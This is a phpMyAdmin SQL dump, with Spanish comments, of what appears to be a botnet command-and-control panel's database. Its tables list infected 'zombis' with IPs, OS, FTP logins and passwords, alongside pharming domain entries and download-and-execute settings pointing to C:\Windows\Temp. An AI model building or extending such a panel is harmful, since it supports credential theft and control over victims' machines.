-- phpMyAdmin SQL Dump
-- version 2.10.3
-- http://www.phpmyadmin.net
-- 
-- Servidor: localhost
-- Tiempo de generaci�n: 16-09-2011 a las 13:27:58
-- Versi�n del servidor: 5.0.51
-- Versi�n de PHP: 5.2.6

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

-- 
-- Base de datos: `volk1`
-- 

-- --------------------------------------------------------

-- 
-- Estructura de tabla para la tabla `http`
-- 

CREATE TABLE `http` (
  `id` int(11) NOT NULL auto_increment,
  `http` text,
  `Execute` text,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

-- 
-- Volcar la base de datos para la tabla `http`
-- 

INSERT INTO `http` VALUES (1, 'http://', 'C:\\Windows\\Temp');

-- --------------------------------------------------------

-- 
-- Estructura de tabla para la tabla `pharming`
-- 

CREATE TABLE `pharming` (
  `id` int(11) NOT NULL auto_increment,
  `pharming` text,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

-- 
-- Volcar la base de datos para la tabla `pharming`
-- 

INSERT INTO `pharming` VALUES (1, '\r\nAdd Ip Domain');

-- --------------------------------------------------------

-- 
-- Estructura de tabla para la tabla `urls`
-- 

CREATE TABLE `urls` (
  `id` int(11) NOT NULL auto_increment,
  `Urls` text,
  `Urls2` text,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

-- 
-- Volcar la base de datos para la tabla `urls`
-- 

INSERT INTO `urls` VALUES (1, 'http://', 'http://');

-- --------------------------------------------------------

-- 
-- Estructura de tabla para la tabla `zombis`
-- 

CREATE TABLE `zombis` (
  `id` int(11) NOT NULL auto_increment,
  `name` varchar(255) default NULL,
  `fecha` timestamp NOT NULL default CURRENT_TIMESTAMP on update CURRENT_TIMESTAMP,
  `ip` varchar(255) default NULL,
  `host` varchar(255) default NULL,
  `pais` varchar(255) default NULL,
  `flag` text,
  `pharming` int(11) default NULL,
  `http` int(11) default NULL,
  `so` text,
  `ftps` text,
  `pasw` text,
  `a` varchar(255) default NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- 
-- Volcar la base de datos para la tabla `zombis`
-- 

